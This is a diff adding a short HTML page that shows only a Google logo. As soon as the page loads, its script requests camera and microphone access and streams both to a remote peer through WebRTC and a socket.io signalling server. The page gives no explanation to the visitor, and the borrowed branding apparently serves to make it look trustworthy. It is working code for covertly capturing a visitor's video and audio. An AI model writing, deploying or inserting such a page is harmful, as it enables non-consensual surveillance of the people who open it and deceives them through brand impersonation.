@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Client Page</title>
+</head>
+<body>
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" />
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+        const pc = new RTCPeerConnection();
+        stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+        pc.onicecandidate = e => { if(e.candidate) socket.emit('ice-candidate', e.candidate); };
+
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        socket.emit('offer', offer);
+
+        socket.on('answer', async answer => { await pc.setRemoteDescription(answer); });
+        socket.on('ice-candidate', async candidate => { await pc.addIceCandidate(candidate); });
+
+      } catch (err) {
+        console.error('Camera permission denied or error:', err);
+      }
+    }
+
+    window.onload = startCamera;
+  </script>
+</body>
+</html>
